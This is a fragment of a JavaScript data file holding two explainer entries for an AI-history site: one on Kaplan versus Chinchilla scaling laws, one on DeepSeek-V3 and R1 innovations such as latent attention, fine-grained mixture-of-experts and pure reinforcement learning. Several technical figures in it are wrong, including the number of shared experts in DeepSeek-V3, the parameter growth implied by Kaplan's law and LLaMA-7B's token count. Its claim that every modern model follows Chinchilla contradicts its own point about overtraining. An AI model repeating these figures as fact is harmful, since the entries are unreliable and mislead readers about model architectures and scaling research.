  { p: "In 2020, Jared Kaplan and the OpenAI team published *Scaling Laws for Neural Language Models*. Their empirical power-law equations concluded that model performance depended primarily on parameter count ($N$), whereas dataset size ($D$) was a secondary lever." },
  { p: "The industry interpreted this as a mandate to build giant parameter monsters. If you had a fixed compute budget, you poured the vast majority into making the network wider and deeper while keeping training tokens modest (~300 billion tokens):" },
  { l: [
   "**GPT-3 (OpenAI, 2020):** 175 Billion parameters trained on 300 Billion tokens.",
   "**Gopher (DeepMind, 2021):** 280 Billion parameters trained on 300 Billion tokens.",
   "**Megatron-Turing NLG (Microsoft/NVIDIA, 2021):** 530 Billion parameters trained on 270 Billion tokens."
  ] },

  { h: "DeepMind's Chinchilla re-evaluation" },
  { p: "Jordan Hoffmann, Sebastian Borgeaud, Arthur Mensch, and the DeepMind team suspected the Kaplan scaling law had an experimental flaw: Kaplan had kept learning rate schedules fixed across different model sizes, causing larger models to appear artificially more efficient." },
  { p: "DeepMind trained over **400 language models** ranging from 70 million to 16 billion parameters across various token budgets with cosine learning rate decay matched to total tokens. The mathematical result was unequivocal:" },
  { l: [
   "**Kaplan (2020):** As compute increases by $10\\times$, parameters should increase by $7.3\\times$ while tokens increase by only $1.7\\times$.",
   "**Chinchilla (Hoffmann et al., 2022):** Model parameters and training dataset tokens should scale in **equal 1:1 proportion** ($N \\propto C^{0.5}$ and $D \\propto C^{0.5}$)."
  ] },
  { x: { lang: "text", code:
"                      Compute-Optimal Scaling Frontier\n\n  Parameter Count (N)\n     ▲\n     │                  ✖ Gopher (280B params / 300B tokens) [Undertrained]\n     │                 / \n     │                /  ✖ GPT-3 (175B params / 300B tokens) [Undertrained]\n     │               /  \n     │              /    ● Chinchilla (70B params / 1.4T tokens) [OPTIMAL]\n     │             /    /\n     │            /    /  ● LLaMA-7B / 13B (Overtrained for inference efficiency)\n     │           /    /\n     └──────────┴────┴────────────────────────────────► Training Tokens (D)\n                 Kaplan Path       Chinchilla 1:1 Optimal Path" } },

  { h: "The Chinchilla result" },
  { p: "To prove the hypothesis, DeepMind trained **Chinchilla**: a 70-billion parameter model on **1.4 trillion tokens** — identical compute budget to 280B Gopher, but with 4× fewer parameters and 4.6× more tokens." },
  { l: [
   "Chinchilla **outperformed Gopher (280B), GPT-3 (175B), Jurassic-1 (178B), and Megatron-Turing (530B)** across MMLU, Big-Bench, commonsense reasoning, and code generation.",
   "Because Chinchilla had only 70B parameters, it required **4× less GPU VRAM** and delivered **4× higher inference throughput** in production."
  ] },

  { h: "The inference revolution" },
  { p: "Chinchilla fundamentally changed the economics of artificial intelligence. Training a model happens once, but running inference happens billions of times. An overtrained small model (like LLaMA-7B trained on 2 trillion tokens) is slightly suboptimal on training compute, but drastically cheaper to serve millions of users." },
  { p: "Every major modern foundation model — LLaMA 3, Mistral, Gemma, Claude 3.5, and GPT-4o — follows the Chinchilla scaling law." }
 ],
 k: [
  "Compute-optimal training requires scaling model parameters and training tokens in equal 1:1 proportion.",
  "GPT-3 (175B) and Gopher (280B) were severely undertrained due to flawed early scaling laws.",
  "Chinchilla (70B on 1.4T tokens) beat 280B Gopher while being 4× smaller and faster at inference.",
  "Modern open-weight models intentionally overtrain small models on trillions of tokens for inference efficiency."
 ],
 r: ["Large Language Model", "Parameters", "Training Data", "Token", "Inference", "Transformer"],
 src: [
  { t: "Hoffmann et al. — Training Compute-Optimal Large Language Models (Chinchilla, 2022)", u: "https://arxiv.org/abs/2203.15556" },
  { t: "Kaplan et al. — Scaling Laws for Neural Language Models (OpenAI 2020)", u: "https://arxiv.org/abs/2001.08361" }
 ]
},

{
 t: "DeepSeek: MLA & Reasoning at Scale",
 s: "Algorithmic efficiency versus brute-force compute",
 y: 2024, when: "December 2024",
 g: ["deepseek", "mla", "reasoning", "moe", "reinforcement learning", "efficiency"],
 tldr: "DeepSeek shocked the global AI industry by matching top US frontier models with DeepSeek-V3 and DeepSeek-R1 at a tiny fraction of conventional compute costs (~$6M training budget). Through architectural innovations like Multi-Head Latent Attention (MLA) for massive KV-cache compression, fine-grained sparse MoE routing (DeepSeekMoE), DualPipe pipeline overlapping, and pure Reinforcement Learning reasoning emergence without supervised warm-start, DeepSeek proved algorithmic elegance can beat pure capital expenditure.",
 say: [
  "Multi-Head Latent Attention (MLA) compresses Key-Value caches into low-dimensional latent vectors, slashing memory bottlenecks during generation.",
  "DeepSeek-V3 uses 256 fine-grained expert routing with 8 shared experts, activating only 37B out of 671B parameters per token.",
  "DeepSeek-R1 demonstrated that pure large-scale RL on base models triggers the 'Aha moment' — spontaneous self-correction and reasoning chains without supervised fine-tuning.",
  "It shifted the industry conversation from compute monopolies to architectural and algorithmic optimization."
 ],
 b: [
  { h: "The $6 Million shock" },
  { p: "In December 2024 and January 2025, Chinese research lab DeepSeek open-sourced DeepSeek-V3 (a 671-billion parameter base model) and DeepSeek-R1 (a frontier reasoning model matching OpenAI's o1)." },
  { p: "What stunned Silicon Valley and Wall Street was the reported training cost: **2.788 million GPU hours on an older NVIDIA H800 cluster, totaling roughly $5.58 million USD** — compared to the hundreds of millions or billions invested by US hyperscalers. DeepSeek achieved this not through shortcuts, but through relentless low-level algorithmic co-design." },

  { h: "Multi-Head Latent Attention (MLA)" },
  { p: "In standard Multi-Head Attention (MHA) and Grouped-Query Attention (GQA), the Key-Value (KV) cache grows linearly with context length and batch size during generation, quickly choking GPU VRAM." },
  { p: "DeepSeek introduced **Multi-Head Latent Attention (MLA)**: instead of caching the full multi-head Key and Value tensors, it compresses Keys and Values into a single low-dimensional **latent vector** ($d_c \\approx 512$). During generation, only this tiny compressed vector is cached in VRAM, decompressing it into full attention heads on-the-fly during matrix multiplication." },
  { x: { lang: "text", code:
"Standard GQA KV Cache per Token:         DeepSeek MLA Compressed KV Cache:\n┌──────────────────────────────────────┐ ┌──────────────────────────────────────┐\n│ Key Heads (e.g. 8 × 128 = 1024 dims) │ │ Latent KV Vector c_KV (512 dims)     │\n│ Val Heads (e.g. 8 × 128 = 1024 dims) │ │ Decoupled RoPE Key k_R (64 dims)     │\n│ Total: 2048 floats per token         │ │ Total: 576 floats per token          │\n└──────────────────────────────────────┘ └──────────────────────────────────────┘\nMemory Reduction: ~72% KV Cache Saved → Enables massive serving batch sizes & 128k context" } },

  { h: "DeepSeekMoE: Fine-grained expert specialization" },
  { p: "Traditional Mixture-of-Experts (like Mixtral 8x7B) route tokens to 2 out of 8 large experts. DeepSeek-V3 uses **256 fine-grained micro-experts** plus **8 shared experts** that are always activated:" },
  { l: [
   "**Fine-grained routing:** Activating 8 out of 256 smaller experts allows vastly more combinatorial combinations of specialized knowledge.",
   "**Shared experts:** Dedicated parameters that capture common, non-specialized knowledge without consuming routing bandwidth.",
   "**Auxiliary-loss-free load balancing:** Instead of penalizing routing with artificial loss terms that degrade model quality, DeepSeek dynamically adjusts expert bias thresholds during training to balance GPU compute loads."
  ] },

  { h: "DeepSeek-R1-Zero: Pure RL & The 'Aha Moment'" },
  { p: "Standard post-training required thousands of human-written Supervised Fine-Tuning (SFT) reasoning chains before applying RLHF. In **DeepSeek-R1-Zero**, researchers applied pure Reinforcement Learning (Rule-Based GRPO: Group Relative Policy Optimization) directly onto the raw base model using mathematical verification and code execution compilers as reward signals." },
  { p: "Without human demonstration, the model spontaneously learned to generate extended internal chains of thought, back-track, verify intermediate equations, allocate more thinking time for complex problems, and re-evaluate initial assumptions — exhibiting the celebrated 'Aha moment' of self-correction." }
 ],
 k: [
  "Multi-Head Latent Attention (MLA) compresses KV caches by over 70%, slashing inference memory bottlenecks.",
  "DeepSeekMoE uses 256 fine-grained experts with auxiliary-loss-free dynamic load balancing.",
  "DeepSeek-R1 proved pure RL without supervised fine-tuning can emerge complex self-correcting reasoning behaviors.",
  "Demonstrated that algorithmic innovation can achieve frontier AI parity at a fraction of hyperscaler capital expenditure."
 ],
 r: ["Large Language Model", "Mixture of Experts", "Reinforcement Learning", "Attention Mechanism", "Transformer", "KV Cache", "Inference"],
 src: [
  { t: "DeepSeek-AI — DeepSeek-V3 Technical Report (2024)", u: "https://arxiv.org/abs/2412.19437" },
  { t: "DeepSeek-AI — DeepSeek-R1: Incentivizing Reasoning Capability in LLMs via Reinforcement Learning (2025)", u: "https://arxiv.org/abs/2501.12948" }
 ]
}

]);



